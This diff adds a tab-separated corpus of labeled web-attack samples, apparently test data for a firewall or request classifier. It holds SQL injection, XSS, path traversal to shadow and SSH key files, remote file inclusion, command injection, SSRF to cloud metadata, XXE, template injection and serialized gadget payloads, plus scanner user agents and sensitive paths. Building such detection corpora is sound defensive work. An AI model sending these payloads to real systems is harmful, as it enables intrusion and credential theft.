@@ -1,0 +1,480 @@
+sqli	args	item=9' OR 'p'='p
+sqli	json	item=9' OR 'p'='p
+sqli	form	item=9' OR 'p'='p
+sqli	cookie	item=9' OR 'p'='p
+sqli	args	x') UNION ALL SELECT email FROM customer
+sqli	json	x') UNION ALL SELECT email FROM customer
+sqli	form	x') UNION ALL SELECT email FROM customer
+sqli	cookie	x') UNION ALL SELECT email FROM customer
+sqli	args	12 AND 1=1--
+sqli	json	12 AND 1=1--
+sqli	form	12 AND 1=1--
+sqli	cookie	12 AND 1=1--
+sqli	args	0; SELECT pg_sleep(3)
+sqli	json	0; SELECT pg_sleep(3)
+sqli	form	0; SELECT pg_sleep(3)
+sqli	cookie	0; SELECT pg_sleep(3)
+sqli	args	q=' OR 8>2 #
+sqli	json	q=' OR 8>2 #
+sqli	form	q=' OR 8>2 #
+sqli	cookie	q=' OR 8>2 #
+sqli	args	x'/**/oR/**/'k'='k
+sqli	json	x'/**/oR/**/'k'='k
+sqli	form	x'/**/oR/**/'k'='k
+sqli	cookie	x'/**/oR/**/'k'='k
+sqli	args	7 HAVING 6=6
+sqli	json	7 HAVING 6=6
+sqli	form	7 HAVING 6=6
+sqli	cookie	7 HAVING 6=6
+sqli	args	a') AnD ('x'='x
+sqli	json	a') AnD ('x'='x
+sqli	form	a') AnD ('x'='x
+sqli	cookie	a') AnD ('x'='x
+sqli	args	1/**/UNION/**/SELECT/**/password
+sqli	json	1/**/UNION/**/SELECT/**/password
+sqli	form	1/**/UNION/**/SELECT/**/password
+sqli	cookie	1/**/UNION/**/SELECT/**/password
+sqli	args	x' OR 4 LIKE 4--
+sqli	json	x' OR 4 LIKE 4--
+sqli	form	x' OR 4 LIKE 4--
+sqli	cookie	x' OR 4 LIKE 4--
+xss	args	<svg><set onbegin=alert(1)>
+xss	json	<svg><set onbegin=alert(1)>
+xss	multipart	<svg><set onbegin=alert(1)>
+xss	cookie	<svg><set onbegin=alert(1)>
+xss	args	<img src=x onerror=confirm(2)>
+xss	json	<img src=x onerror=confirm(2)>
+xss	multipart	<img src=x onerror=confirm(2)>
+xss	cookie	<img src=x onerror=confirm(2)>
+xss	args	<details ontoggle=prompt(3) open>
+xss	json	<details ontoggle=prompt(3) open>
+xss	multipart	<details ontoggle=prompt(3) open>
+xss	cookie	<details ontoggle=prompt(3) open>
+xss	args	<iframe srcdoc='<script>alert(4)</script>'>
+xss	json	<iframe srcdoc='<script>alert(4)</script>'>
+xss	multipart	<iframe srcdoc='<script>alert(4)</script>'>
+xss	cookie	<iframe srcdoc='<script>alert(4)</script>'>
+xss	args	<math><mtext><img src=x onerror=1>
+xss	json	<math><mtext><img src=x onerror=1>
+xss	multipart	<math><mtext><img src=x onerror=1>
+xss	cookie	<math><mtext><img src=x onerror=1>
+xss	args	<body onpageshow=alert(5)>
+xss	json	<body onpageshow=alert(5)>
+xss	multipart	<body onpageshow=alert(5)>
+xss	cookie	<body onpageshow=alert(5)>
+xss	args	<video><source onerror=alert(6)>
+xss	json	<video><source onerror=alert(6)>
+xss	multipart	<video><source onerror=alert(6)>
+xss	cookie	<video><source onerror=alert(6)>
+xss	args	<svg><animate onbegin=confirm(7)>
+xss	json	<svg><animate onbegin=confirm(7)>
+xss	multipart	<svg><animate onbegin=confirm(7)>
+xss	cookie	<svg><animate onbegin=confirm(7)>
+xss	args	<input autofocus onfocus=alert(8)>
+xss	json	<input autofocus onfocus=alert(8)>
+xss	multipart	<input autofocus onfocus=alert(8)>
+xss	cookie	<input autofocus onfocus=alert(8)>
+xss	args	<object data='javascript:alert(9)'>
+xss	json	<object data='javascript:alert(9)'>
+xss	multipart	<object data='javascript:alert(9)'>
+xss	cookie	<object data='javascript:alert(9)'>
+traversal	args	..%2f..%2fetc%2fshadow
+traversal	path	..%2f..%2fetc%2fshadow
+traversal	json	..%2f..%2fetc%2fshadow
+traversal	form	..%2f..%2fetc%2fshadow
+traversal	args	%252e%252e%255cwindows%255cwin.ini
+traversal	path	%252e%252e%255cwindows%255cwin.ini
+traversal	json	%252e%252e%255cwindows%255cwin.ini
+traversal	form	%252e%252e%255cwindows%255cwin.ini
+traversal	args	..%252f..%252fproc%252fself%252fenviron
+traversal	path	..%252f..%252fproc%252fself%252fenviron
+traversal	json	..%252f..%252fproc%252fself%252fenviron
+traversal	form	..%252f..%252fproc%252fself%252fenviron
+traversal	args	/download?name=..%2fsecret.txt
+traversal	path	/download?name=..%2fsecret.txt
+traversal	json	/download?name=..%2fsecret.txt
+traversal	form	/download?name=..%2fsecret.txt
+traversal	args	....//....//etc/passwd
+traversal	path	....//....//etc/passwd
+traversal	json	....//....//etc/passwd
+traversal	form	....//....//etc/passwd
+traversal	args	%2e%2e%5cboot.ini
+traversal	path	%2e%2e%5cboot.ini
+traversal	json	%2e%2e%5cboot.ini
+traversal	form	%2e%2e%5cboot.ini
+traversal	args	..%2fvar%2flog%2fauth.log
+traversal	path	..%2fvar%2flog%2fauth.log
+traversal	json	..%2fvar%2flog%2fauth.log
+traversal	form	..%2fvar%2flog%2fauth.log
+traversal	args	/files/%2e%2e%2fprivate
+traversal	path	/files/%2e%2e%2fprivate
+traversal	json	/files/%2e%2e%2fprivate
+traversal	form	/files/%2e%2e%2fprivate
+traversal	args	..%252f..%252froot/.ssh/id_rsa
+traversal	path	..%252f..%252froot/.ssh/id_rsa
+traversal	json	..%252f..%252froot/.ssh/id_rsa
+traversal	form	..%252f..%252froot/.ssh/id_rsa
+traversal	args	..%c0%afetc%c0%afpasswd
+traversal	path	..%c0%afetc%c0%afpasswd
+traversal	json	..%c0%afetc%c0%afpasswd
+traversal	form	..%c0%afetc%c0%afpasswd
+rfi	args	page=https://cdn.example.invalid/shell.phtml
+rfi	json	page=https://cdn.example.invalid/shell.phtml
+rfi	form	page=https://cdn.example.invalid/shell.phtml
+rfi	cookie	page=https://cdn.example.invalid/shell.phtml
+rfi	args	view=php://filter/read=convert.base64-encode/resource=index.php
+rfi	json	view=php://filter/read=convert.base64-encode/resource=index.php
+rfi	form	view=php://filter/read=convert.base64-encode/resource=index.php
+rfi	cookie	view=php://filter/read=convert.base64-encode/resource=index.php
+rfi	args	source=ftp://mirror.example.invalid/a.jsp
+rfi	json	source=ftp://mirror.example.invalid/a.jsp
+rfi	form	source=ftp://mirror.example.invalid/a.jsp
+rfi	cookie	source=ftp://mirror.example.invalid/a.jsp
+rfi	args	include=data://text/plain;base64,PHBocA==
+rfi	json	include=data://text/plain;base64,PHBocA==
+rfi	form	include=data://text/plain;base64,PHBocA==
+rfi	cookie	include=data://text/plain;base64,PHBocA==
+rfi	args	template=https://assets.example.invalid/x.php?x=1
+rfi	json	template=https://assets.example.invalid/x.php?x=1
+rfi	form	template=https://assets.example.invalid/x.php?x=1
+rfi	cookie	template=https://assets.example.invalid/x.php?x=1
+rfi	args	file=php://input
+rfi	json	file=php://input
+rfi	form	file=php://input
+rfi	cookie	file=php://input
+rfi	args	path=https://files.example.invalid/loader.php%3Fx=1
+rfi	json	path=https://files.example.invalid/loader.php%3Fx=1
+rfi	form	path=https://files.example.invalid/loader.php%3Fx=1
+rfi	cookie	path=https://files.example.invalid/loader.php%3Fx=1
+rfi	args	inc=ftp://host.example.invalid/code.jsp
+rfi	json	inc=ftp://host.example.invalid/code.jsp
+rfi	form	inc=ftp://host.example.invalid/code.jsp
+rfi	cookie	inc=ftp://host.example.invalid/code.jsp
+rfi	args	theme=data://text/plain,<?php
+rfi	json	theme=data://text/plain,<?php
+rfi	form	theme=data://text/plain,<?php
+rfi	cookie	theme=data://text/plain,<?php
+rfi	args	remote=https://static.example.invalid/a.phtml
+rfi	json	remote=https://static.example.invalid/a.phtml
+rfi	form	remote=https://static.example.invalid/a.phtml
+rfi	cookie	remote=https://static.example.invalid/a.phtml
+rce	args	x%0aid
+rce	json	x%0aid
+rce	form	x%0aid
+rce	cookie	x%0aid
+rce	args	x && python3 -c 'print(2)'
+rce	json	x && python3 -c 'print(2)'
+rce	form	x && python3 -c 'print(2)'
+rce	cookie	x && python3 -c 'print(2)'
+rce	args	x|${IFS}sh
+rce	json	x|${IFS}sh
+rce	form	x|${IFS}sh
+rce	cookie	x|${IFS}sh
+rce	args	x; /usr/bin/whoami
+rce	json	x; /usr/bin/whoami
+rce	form	x; /usr/bin/whoami
+rce	cookie	x; /usr/bin/whoami
+rce	args	x%0a/bin/uname
+rce	json	x%0a/bin/uname
+rce	form	x%0a/bin/uname
+rce	cookie	x%0a/bin/uname
+rce	args	x||ruby -c 'puts 1'
+rce	json	x||ruby -c 'puts 1'
+rce	form	x||ruby -c 'puts 1'
+rce	cookie	x||ruby -c 'puts 1'
+rce	args	x; perl -e 'print 1'
+rce	json	x; perl -e 'print 1'
+rce	form	x; perl -e 'print 1'
+rce	cookie	x; perl -e 'print 1'
+rce	args	x|${IFS}bash
+rce	json	x|${IFS}bash
+rce	form	x|${IFS}bash
+rce	cookie	x|${IFS}bash
+rce	args	x && php -c 'echo 1;'
+rce	json	x && php -c 'echo 1;'
+rce	form	x && php -c 'echo 1;'
+rce	cookie	x && php -c 'echo 1;'
+rce	args	x; /bin/id
+rce	json	x; /bin/id
+rce	form	x; /bin/id
+rce	cookie	x; /bin/id
+ssrf	args	fetch=http://[::1]:9000/admin
+ssrf	json	fetch=http://[::1]:9000/admin
+ssrf	form	fetch=http://[::1]:9000/admin
+ssrf	cookie	fetch=http://[::1]:9000/admin
+ssrf	args	url=http://0177.0.0.1/secret
+ssrf	json	url=http://0177.0.0.1/secret
+ssrf	form	url=http://0177.0.0.1/secret
+ssrf	cookie	url=http://0177.0.0.1/secret
+ssrf	args	target=http://2130706433/latest/meta-data
+ssrf	json	target=http://2130706433/latest/meta-data
+ssrf	form	target=http://2130706433/latest/meta-data
+ssrf	cookie	target=http://2130706433/latest/meta-data
+ssrf	args	callback=http://0x7f000001/debug
+ssrf	json	callback=http://0x7f000001/debug
+ssrf	form	callback=http://0x7f000001/debug
+ssrf	cookie	callback=http://0x7f000001/debug
+ssrf	args	dest=http://[fe80::1]/
+ssrf	json	dest=http://[fe80::1]/
+ssrf	form	dest=http://[fe80::1]/
+ssrf	cookie	dest=http://[fe80::1]/
+ssrf	args	probe=http://[fd00::2]/internal
+ssrf	json	probe=http://[fd00::2]/internal
+ssrf	form	probe=http://[fd00::2]/internal
+ssrf	cookie	probe=http://[fd00::2]/internal
+ssrf	args	next=http://192.168.2.4/private
+ssrf	json	next=http://192.168.2.4/private
+ssrf	form	next=http://192.168.2.4/private
+ssrf	cookie	next=http://192.168.2.4/private
+ssrf	args	endpoint=http://172.20.0.2/
+ssrf	json	endpoint=http://172.20.0.2/
+ssrf	form	endpoint=http://172.20.0.2/
+ssrf	cookie	endpoint=http://172.20.0.2/
+ssrf	args	resource=http://10.4.5.6/metrics
+ssrf	json	resource=http://10.4.5.6/metrics
+ssrf	form	resource=http://10.4.5.6/metrics
+ssrf	cookie	resource=http://10.4.5.6/metrics
+ssrf	args	url=http://169.254.169.254/metadata
+ssrf	json	url=http://169.254.169.254/metadata
+ssrf	form	url=http://169.254.169.254/metadata
+ssrf	cookie	url=http://169.254.169.254/metadata
+xxe	xml	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>
+xxe	json	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>
+xxe	form	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>
+xxe	multipart	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>
+xxe	xml	<!DOCTYPE a [<!ENTITY % p SYSTEM 'http://127.0.0.1/x'> %p;]>
+xxe	json	<!DOCTYPE a [<!ENTITY % p SYSTEM 'http://127.0.0.1/x'> %p;]>
+xxe	form	<!DOCTYPE a [<!ENTITY % p SYSTEM 'http://127.0.0.1/x'> %p;]>
+xxe	multipart	<!DOCTYPE a [<!ENTITY % p SYSTEM 'http://127.0.0.1/x'> %p;]>
+xxe	xml	<!DOCTYPE data [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]>
+xxe	json	<!DOCTYPE data [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]>
+xxe	form	<!DOCTYPE data [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]>
+xxe	multipart	<!DOCTYPE data [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]>
+xxe	xml	<!DOCTYPE x [<!ENTITY e SYSTEM 'http://169.254.169.254/'>]>
+xxe	json	<!DOCTYPE x [<!ENTITY e SYSTEM 'http://169.254.169.254/'>]>
+xxe	form	<!DOCTYPE x [<!ENTITY e SYSTEM 'http://169.254.169.254/'>]>
+xxe	multipart	<!DOCTYPE x [<!ENTITY e SYSTEM 'http://169.254.169.254/'>]>
+xxe	xml	<!DOCTYPE r [<!ENTITY % d SYSTEM 'file:///etc/shadow'> %d;]>
+xxe	json	<!DOCTYPE r [<!ENTITY % d SYSTEM 'file:///etc/shadow'> %d;]>
+xxe	form	<!DOCTYPE r [<!ENTITY % d SYSTEM 'file:///etc/shadow'> %d;]>
+xxe	multipart	<!DOCTYPE r [<!ENTITY % d SYSTEM 'file:///etc/shadow'> %d;]>
+xxe	xml	<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///secret'>]>
+xxe	json	<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///secret'>]>
+xxe	form	<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///secret'>]>
+xxe	multipart	<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///secret'>]>
+xxe	xml	<!DOCTYPE doc [<!ENTITY x SYSTEM 'http://localhost/a'>]>
+xxe	json	<!DOCTYPE doc [<!ENTITY x SYSTEM 'http://localhost/a'>]>
+xxe	form	<!DOCTYPE doc [<!ENTITY x SYSTEM 'http://localhost/a'>]>
+xxe	multipart	<!DOCTYPE doc [<!ENTITY x SYSTEM 'http://localhost/a'>]>
+xxe	xml	<!DOCTYPE root [<!ENTITY ext SYSTEM 'file:///var/log/auth.log'>]>
+xxe	json	<!DOCTYPE root [<!ENTITY ext SYSTEM 'file:///var/log/auth.log'>]>
+xxe	form	<!DOCTYPE root [<!ENTITY ext SYSTEM 'file:///var/log/auth.log'>]>
+xxe	multipart	<!DOCTYPE root [<!ENTITY ext SYSTEM 'file:///var/log/auth.log'>]>
+xxe	xml	<!DOCTYPE x [<!ENTITY % a SYSTEM 'http://internal/'> %a;]>
+xxe	json	<!DOCTYPE x [<!ENTITY % a SYSTEM 'http://internal/'> %a;]>
+xxe	form	<!DOCTYPE x [<!ENTITY % a SYSTEM 'http://internal/'> %a;]>
+xxe	multipart	<!DOCTYPE x [<!ENTITY % a SYSTEM 'http://internal/'> %a;]>
+xxe	xml	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]>
+xxe	json	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]>
+xxe	form	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]>
+xxe	multipart	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]>
+ssti	args	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	json	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	form	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	cookie	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	args	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	json	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	form	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	cookie	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	args	<% Runtime.getRuntime().exec('id'); %>
+ssti	json	<% Runtime.getRuntime().exec('id'); %>
+ssti	form	<% Runtime.getRuntime().exec('id'); %>
+ssti	cookie	<% Runtime.getRuntime().exec('id'); %>
+ssti	args	{{request.application.__globals__}}
+ssti	json	{{request.application.__globals__}}
+ssti	form	{{request.application.__globals__}}
+ssti	cookie	{{request.application.__globals__}}
+ssti	args	${{7*7}}
+ssti	json	${{7*7}}
+ssti	form	${{7*7}}
+ssti	cookie	${{7*7}}
+ssti	args	{{ ''.__class__.__mro__ }}
+ssti	json	{{ ''.__class__.__mro__ }}
+ssti	form	{{ ''.__class__.__mro__ }}
+ssti	cookie	{{ ''.__class__.__mro__ }}
+ssti	args	<%= system('id') %>
+ssti	json	<%= system('id') %>
+ssti	form	<%= system('id') %>
+ssti	cookie	<%= system('id') %>
+ssti	args	${#context.get('x')}
+ssti	json	${#context.get('x')}
+ssti	form	${#context.get('x')}
+ssti	cookie	${#context.get('x')}
+ssti	args	{{config.items()}}
+ssti	json	{{config.items()}}
+ssti	form	{{config.items()}}
+ssti	cookie	{{config.items()}}
+ssti	args	{{ self.__init__.__globals__ }}
+ssti	json	{{ self.__init__.__globals__ }}
+ssti	form	{{ self.__init__.__globals__ }}
+ssti	cookie	{{ self.__init__.__globals__ }}
+deserialization	args	rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==
+deserialization	json	rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==
+deserialization	form	rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==
+deserialization	cookie	rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==
+deserialization	args	aced000573720011
+deserialization	json	aced000573720011
+deserialization	form	aced000573720011
+deserialization	cookie	aced000573720011
+deserialization	args	{"$type":"System.Diagnostics.Process"}
+deserialization	json	{"$type":"System.Diagnostics.Process"}
+deserialization	form	{"$type":"System.Diagnostics.Process"}
+deserialization	cookie	{"$type":"System.Diagnostics.Process"}
+deserialization	args	O:8:"stdClass":0:{}
+deserialization	json	O:8:"stdClass":0:{}
+deserialization	form	O:8:"stdClass":0:{}
+deserialization	cookie	O:8:"stdClass":0:{}
+deserialization	args	java.io.ObjectInputStream payload
+deserialization	json	java.io.ObjectInputStream payload
+deserialization	form	java.io.ObjectInputStream payload
+deserialization	cookie	java.io.ObjectInputStream payload
+deserialization	args	AAEAAAD/////AQAAAAAAAA==
+deserialization	json	AAEAAAD/////AQAAAAAAAA==
+deserialization	form	AAEAAAD/////AQAAAAAAAA==
+deserialization	cookie	AAEAAAD/////AQAAAAAAAA==
+deserialization	args	YTozOntpOjA7czo0OiJleGVjIjt9
+deserialization	json	YTozOntpOjA7czo0OiJleGVjIjt9
+deserialization	form	YTozOntpOjA7czo0OiJleGVjIjt9
+deserialization	cookie	YTozOntpOjA7czo0OiJleGVjIjt9
+deserialization	args	gASVJAAAAAAAAACMCG9zLnN5c3RlbZST
+deserialization	json	gASVJAAAAAAAAACMCG9zLnN5c3RlbZST
+deserialization	form	gASVJAAAAAAAAACMCG9zLnN5c3RlbZST
+deserialization	cookie	gASVJAAAAAAAAACMCG9zLnN5c3RlbZST
+deserialization	args	!ruby/object:ERB
+deserialization	json	!ruby/object:ERB
+deserialization	form	!ruby/object:ERB
+deserialization	cookie	!ruby/object:ERB
+deserialization	args	AC ED 00 05 java serialization
+deserialization	json	AC ED 00 05 java serialization
+deserialization	form	AC ED 00 05 java serialization
+deserialization	cookie	AC ED 00 05 java serialization
+scanner	ua	WPScan/3.8 sample-0
+scanner	ua	WPScan/3.8 sample-0
+scanner	ua	WPScan/3.8 sample-0
+scanner	ua	WPScan/3.8 sample-0
+scanner	ua	Arachni/v2.0 sample-1
+scanner	ua	Arachni/v2.0 sample-1
+scanner	ua	Arachni/v2.0 sample-1
+scanner	ua	Arachni/v2.0 sample-1
+scanner	ua	feroxbuster/2.10 sample-2
+scanner	ua	feroxbuster/2.10 sample-2
+scanner	ua	feroxbuster/2.10 sample-2
+scanner	ua	feroxbuster/2.10 sample-2
+scanner	ua	ffuf/2.1 sample-3
+scanner	ua	ffuf/2.1 sample-3
+scanner	ua	ffuf/2.1 sample-3
+scanner	ua	ffuf/2.1 sample-3
+scanner	ua	nuclei/3.0 sample-4
+scanner	ua	nuclei/3.0 sample-4
+scanner	ua	nuclei/3.0 sample-4
+scanner	ua	nuclei/3.0 sample-4
+scanner	ua	WhatWeb/0.6 sample-5
+scanner	ua	WhatWeb/0.6 sample-5
+scanner	ua	WhatWeb/0.6 sample-5
+scanner	ua	WhatWeb/0.6 sample-5
+scanner	ua	OpenVAS Scanner sample-6
+scanner	ua	OpenVAS Scanner sample-6
+scanner	ua	OpenVAS Scanner sample-6
+scanner	ua	OpenVAS Scanner sample-6
+scanner	ua	httpx/1.6 sample-7
+scanner	ua	httpx/1.6 sample-7
+scanner	ua	httpx/1.6 sample-7
+scanner	ua	httpx/1.6 sample-7
+scanner	ua	gobuster/3.6 sample-8
+scanner	ua	gobuster/3.6 sample-8
+scanner	ua	gobuster/3.6 sample-8
+scanner	ua	gobuster/3.6 sample-8
+scanner	ua	sqlmap/1.8 sample-9
+scanner	ua	sqlmap/1.8 sample-9
+scanner	ua	sqlmap/1.8 sample-9
+scanner	ua	sqlmap/1.8 sample-9
+sensitive	path	/.hg/store/manifest
+sensitive	path	/.hg/store/manifest
+sensitive	path	/.hg/store/manifest
+sensitive	path	/.hg/store/manifest
+sensitive	path	/server-status?full
+sensitive	path	/server-status?full
+sensitive	path	/server-status?full
+sensitive	path	/server-status?full
+sensitive	path	/actuator/heapdump
+sensitive	path	/actuator/heapdump
+sensitive	path	/actuator/heapdump
+sensitive	path	/actuator/heapdump
+sensitive	path	/debug/vars
+sensitive	path	/debug/vars
+sensitive	path	/debug/vars
+sensitive	path	/debug/vars
+sensitive	path	/config.php.orig
+sensitive	path	/config.php.orig
+sensitive	path	/config.php.orig
+sensitive	path	/config.php.orig
+sensitive	path	/backup/db.sql.gz
+sensitive	path	/backup/db.sql.gz
+sensitive	path	/backup/db.sql.gz
+sensitive	path	/backup/db.sql.gz
+sensitive	path	/.docker/config.json
+sensitive	path	/.docker/config.json
+sensitive	path	/.docker/config.json
+sensitive	path	/.docker/config.json
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/id_ed25519
+sensitive	path	/id_ed25519
+sensitive	path	/id_ed25519
+sensitive	path	/id_ed25519
+sensitive	path	/.npmrc
+sensitive	path	/.npmrc
+sensitive	path	/.npmrc
+sensitive	path	/.npmrc
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=TRACE
+protocol	protocol	unusual_method=TRACE
+protocol	protocol	unusual_method=TRACE
+protocol	protocol	unusual_method=TRACE
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	duplicate_content_length
+protocol	protocol	duplicate_content_length
+protocol	protocol	duplicate_content_length
+protocol	protocol	unusual_method=PRI
+protocol	protocol	unusual_method=PRI
+protocol	protocol	unusual_method=PRI
+protocol	protocol	unusual_method=PRI
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	duplicate_content_length
+protocol	protocol	duplicate_content_length
+protocol	protocol	duplicate_content_length
+protocol	protocol	unusual_method=TRACK
+protocol	protocol	unusual_method=TRACK
+protocol	protocol	unusual_method=TRACK
+protocol	protocol	unusual_method=TRACK
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	missing_host
+protocol	protocol	missing_host
